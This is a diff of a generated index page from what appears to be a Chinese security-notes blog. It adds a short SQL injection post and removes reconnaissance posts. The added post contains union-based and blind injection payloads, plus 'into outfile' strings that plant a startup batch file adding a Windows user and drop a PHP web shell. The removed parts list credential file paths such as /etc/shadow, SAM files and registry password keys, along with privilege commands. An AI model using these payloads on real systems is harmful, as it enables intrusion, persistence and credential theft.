@@ -193,7 +193,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/C-primer/" style="font-size: 15px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 16.67px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.67px;">基础</a> <a href="/tags/存档/" style="font-size: 11.67px;">存档</a> <a href="/tags/工具/" style="font-size: 18.33px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 13.33px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 13.33px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 11.67px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.67px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+                        <a href="/tags/C-primer/" style="font-size: 15.71px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 17.14px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.43px;">基础</a> <a href="/tags/存档/" style="font-size: 11.43px;">存档</a> <a href="/tags/工具/" style="font-size: 18.57px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 12.86px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 14.29px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 11.43px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.43px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
                     </div>
                 </section>
                 
@@ -273,6 +273,267 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/sql注入/" class="article-date">
+      <time datetime="2018-12-24T13:55:10.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/sql注入/">sql注入</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>定义： 攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。</li>
+<li>危害：<ol>
+<li>数据库信息泄漏</li>
+<li>网页篡改</li>
+<li>挂马</li>
+<li>服务器被远程控制</li>
+<li>瘫痪全系统</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li>常用sql语句<ul>
+<li>判断数据库<ul>
+<li><code>and exsits(select * from msysobjects)&gt;0</code> access</li>
+<li><code>and exsits(select * from sysobjects)&gt;0</code> sqlserver</li>
+</ul>
+</li>
+<li>判断数据库表<ul>
+<li><code>and exists(select * from admin)</code></li>
+</ul>
+</li>
+<li>判断数据库列名<ul>
+<li><code>and exists(select admin from admin)</code></li>
+</ul>
+</li>
+<li>判断数据字段内容的长度<ul>
+<li><code>and (select len(admin) from admin)=5</code> 如果返回正常说明管理员账户的长度为5</li>
+</ul>
+</li>
+<li>判断数据第一个字符内容<ul>
+<li>and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100 返回正常说明该字符的ascii码值大于100</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>偏移注入<br>偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为<br><code>http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin</code></p>
+</li>
+<li><p>利用注入漏洞执行系统命令</p>
+<ul>
+<li><p>第一种方法： 需要有系统权限<br><code>and 1 = 2 union select 1, &quot;net user seven 123 /add&quot;, 2,3,4 into outfile &#39;C://Documments and Settings/Administrator/[开始] 菜单/程序/启动/1.bat&#39;</code></p>
+</li>
+<li><p>第二种方法<br><code>and 1 = 2 union select 1, &quot;&lt;pre&gt;&lt;body&gt;&lt;?@system($_GET[&#39;cc&#39;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&quot;,3,4,5,6,7 into outfile &#39;C:/Inetpub/wwwroot/mysql-sql/cr.php&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-httpfuzzer" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/httpfuzzer/" class="article-date">
+      <time datetime="2018-12-24T13:52:44.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/httpfuzzer/">httpfuzzer</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-cms" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/cms/" class="article-date">
+      <time datetime="2018-12-24T13:44:16.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/cms/">cms</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>网站常见后台有：</p>
+<ul>
+<li>织梦</li>
+<li>discuz</li>
+<li>帝国</li>
+<li>phpweb</li>
+<li>wordpress</li>
+<li>aspcms</li>
+<li>科讯</li>
+<li>南方</li>
+<li>良精</li>
+<li>ecshop</li>
+</ul>
+<p>常见默认管理页面：</p>
+<ul>
+<li>admin</li>
+<li>admin.php</li>
+<li>wp-admin</li>
+<li>manager</li>
+<li>login_admin</li>
+<li>login_manager</li>
+<li>login.asp</li>
+<li>houtai</li>
+<li>denglu</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后台管理/">后台管理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/基础/">基础</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
   
     <article id="post-下载漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -642,6 +903,12 @@
 <td style="text-align:center"></td>
 </tr>
 <tr>
+<td style="text-align:center">31</td>
+<td style="text-align:center">木马Master Paradise、Hackers Pardadise 开放</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
 <td style="text-align:center">53/udp</td>
 <td style="text-align:center">DNS服务</td>
 <td style="text-align:center">DNS域传送、针对dns的拒绝服务攻击、枚举二级域名，泄漏域名信息</td>
@@ -657,6 +924,12 @@
 <td style="text-align:center">80/443/3128/8080/8081/8443/9081</td>
 <td style="text-align:center">http协议代理服务器常用端口</td>
 <td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">109</td>
+<td style="text-align:center">POP3服务</td>
+<td style="text-align:center">缓冲区溢出</td>
 <td style="text-align:center"></td>
 </tr>
 <tr>
@@ -983,331 +1256,9 @@
 
 
   
-    <article id="post-linux基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/linux基本信息收集/" class="article-date">
-      <time datetime="2018-12-15T02:28:21.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/linux基本信息收集/">linux基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>/etc/resolv.conf</li>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-<li>/etc, /usr/local/etc</li>
-<li>.ssh , .gnupg</li>
-<li>/tmp</li>
-<li>whoami, who -a</li>
-<li>ifconfig -a , iptables -L -n , netstat -rn</li>
-<li>uname -a , ps aux</li>
-<li>dpkg -l | head</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-windows基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/windows基本信息收集/" class="article-date">
-      <time datetime="2018-12-15T02:20:20.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/windows基本信息收集/">windows基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>ipconfig /all, ipconfig /displaydns, netstat -bnao, netstat -r</li>
-<li>net view, net view /domain</li>
-<li>net user /domain, net user %username% /domain</li>
-<li>net accounts, net share</li>
-<li>net localgroup administrators username /add</li>
-<li>net group “Domain Controllers” /domain</li>
-</ol>
-<ol>
-<li>net share name$=C:\/unlimited</li>
-<li><p>net user username /active:yes /domain</p>
-</li>
-<li><p>SAM数据库 ，注册表文件</p>
-</li>
-<li>%SYSTEMROOT%\repair\SAM</li>
-<li>%SYSTEMROOT%\System32\config\RegBack\SAM</li>
-<li>业务数据库 ； 身份认证数据库</li>
-<li>临时文件目录</li>
-<li>UserProfile\AppData\Local\Microsoft\Window\Temporary Internet Files\</li>
-</ol>
-<p>注册表信息：</p>
-<ol>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass</li>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss</li>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpass</li>
-<li>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</li>
-<li>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/12/基本信息收集/" class="article-date">
-      <time datetime="2018-12-12T14:13:00.000Z" itemprop="datePublished">2018-12-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/12/基本信息收集/">基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ul>
-<li><p>Linux下</p>
-<ul>
-<li>/etc/resolv.conf</li>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-</ul>
-<p>whoami 或者who -a<br>ifconfig -a iptables -L -n<br>uname -a 或者iptables -L -n setstat -m</p>
-</li>
-</ul>
-<hr>
-<ul>
-<li><p>后台查找</p>
-<ol>
-<li>弱口令默认后台： admin, admin/login.asp, manage, login.asp等常见后台</li>
-<li>查看网页的链接： 一般来说， 网站的主页有管理登录类似的东西，有些可能被管理员已经删掉</li>
-<li>查看网站图片的属性</li>
-<li>查看网站使用的管理系统，从而确定后台</li>
-<li>用工具查找：wwwscan， intellitamper，御剑</li>
-<li>robots.txt的帮助： robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看。</li>
-<li>GoogleHacker</li>
-<li>查看网站使用的编辑器是否有后台</li>
-<li>短文件利用</li>
-<li>sqlmap –sql-shell load_file(‘d:/wwroot/index.php’);</li>
-</ol>
-</li>
-<li><p>url采集<br>采集相关url的同类网站</p>
-<ol>
-<li>例如php?id=</li>
-<li>漏洞网站</li>
-<li>url采集器</li>
-</ol>
-</li>
-<li><p>整站分析</p>
-<ol>
-<li>服务器类型<ul>
-<li>服务器平台，版本等</li>
-</ul>
-</li>
-<li>网站容器<ul>
-<li>搭建网站的服务组件，例如： iis， apache， nginx， tomcat等</li>
-</ul>
-</li>
-<li>脚本类型<ul>
-<li>asp，php，jsp，axpx等</li>
-</ul>
-</li>
-<li>数据库类型<ul>
-<li>access， sqlserver, mysql, oracle, postgresql</li>
-</ul>
-</li>
-<li>cms类型</li>
-<li>waf</li>
-</ol>
-</li>
-<li><p>敏感目录</p>
-<ol>
-<li>收集方向<ul>
-<li>robots.txt, 后台目录， 安装包， 上传目录， mysql管理接口， 安装页面， phpinfo， 编辑器，iis短文件</li>
-</ul>
-</li>
-<li>常用工具<ul>
-<li>字典爆破：御剑，dirbuster, wwwscan, IIS_shortname_Scanner等</li>
-<li>蜘蛛爬行：爬行菜刀， webrobot，burp</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><p>域名信息</p>
-<ol>
-<li>对应ip收集<ul>
-<li>相关域名对应的ip， 相关工具：nslookup</li>
-</ul>
-</li>
-<li>子域名收集<ul>
-<li>工具：layer,subDomainsBrute</li>
-</ul>
-</li>
-<li>whois信息查询<ul>
-<li>根据已知域名反查，分析此域名的注册人，邮箱，电话等</li>
-<li>工具：爱站网， 站长工具，微步在线（<a href="https://x.threatbook.cn）" target="_blank" rel="noopener">https://x.threatbook.cn）</a><pre><code>site.ip138.com,    searchdns.netcraft.com
-</code></pre></li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
